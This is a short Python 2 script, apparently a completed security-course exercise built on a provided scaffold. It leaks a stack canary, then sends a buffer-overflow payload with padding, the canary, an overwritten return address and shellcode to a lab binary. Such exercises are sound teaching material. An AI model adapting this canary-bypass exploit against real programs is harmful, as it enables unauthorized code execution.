#!/usr/bin/env python2

from scaffold import *

### YOUR CODE STARTS HERE ###
# first pass
p.send('aaaaaaaaaaaa\\x\n')
pancake = p.recvline()
canary = pancake[13:17]
print(" ".join("{:02x}".format(ord(c)) for c in canary))

# second pass
m = 15
x = '\x00'
n = 8
rip = "\xf4\xfc\xff\xbf"
exploit = 'A' * m + x + canary + 'B' * n + rip + SHELLCODE + '\n'
p.send(exploit)

# Example send:
# p.send('testA\n')

# Example receive:
# assert p.recvline() == 'testA'

# HINT: the last line of your exploit should look something like:
# p.send('A' * m + canary + 'B' * n + rip + SHELLCODE + '\n')
# where m, canary, n and rip are all values you must determine
# and you might need to add a '\x00' somewhere

### YOUR CODE  ENDS  HERE ###

returncode = p.end()

if returncode == -11: print 'segmentation fault or stack canary!'
elif returncode != 0: print 'return code', returncode
